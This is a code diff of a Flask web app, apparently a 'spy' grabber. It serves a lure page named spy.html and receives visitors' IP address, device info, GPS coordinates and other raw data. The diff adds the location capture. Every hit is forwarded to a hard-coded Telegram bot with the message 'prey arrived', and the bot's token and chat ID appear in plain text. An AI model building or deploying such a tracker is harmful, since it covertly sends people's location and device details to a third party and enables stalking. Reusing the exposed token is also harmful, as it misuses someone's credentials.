@@ -6,35 +6,45 @@ app = Flask(__name__)
 
 # ====== Telegram Configuration ======
 BOT_TOKEN = "7816397892:AAF6GslyJpBOv-ax4t5FdR-NOSOjESW1jMg"
-CHAT_ID = "6908281054"  # ← یہاں اپنا اصل چیٹ آئی ڈی لگاؤ
+CHAT_ID = "6908281054"  # ← اپنی چیٹ آئی ڈی یہاں لگائیں
 
 # ====== HTML Route ======
 @app.route('/')
 def index():
     return render_template("spy.html")
 
-# ====== Data Receiver Route ======
+# ====== Data Receiver ======
 @app.route('/collect', methods=['POST'])
 def collect():
-    data = request.json
-    ip = request.remote_addr
-    user_agent = request.headers.get('User-Agent')
+    try:
+        data = request.get_json()  # JSON body
+        ip = request.remote_addr
+        user_agent = request.headers.get('User-Agent')
 
-    message = f"""
+        latitude = data.get("latitude", "❌")
+        longitude = data.get("longitude", "❌")
+
+        location_link = f"https://www.google.com/maps?q={latitude},{longitude}" if latitude != "❌" else "Location not shared"
+
+        message = f"""
 👁️ شکار آیا!
 🌐 IP Address: {ip}
-📱 Device: {user_agent}
+📱 Device Info: {user_agent}
+📍 Location: {location_link}
 🧠 Raw Data: {data}
-    """
+        """
 
-    # Telegram پر بھیجو
-    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
-    payload = {'chat_id': CHAT_ID, 'text': message}
-    requests.post(url, data=payload)
+        # Telegram Message Send
+        telegram_url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
+        payload = {'chat_id': CHAT_ID, 'text': message}
+        requests.post(telegram_url, data=payload)
 
-    return "OK", 200
+        return "Data received", 200
 
-# ====== Start App on Render ======
+    except Exception as e:
+        return f"Error: {e}", 500
+
+# ====== Run App ======
 if __name__ == '__main__':
     port = int(os.environ.get("PORT", 10000))
     app.run(host="0.0.0.0", port=port)
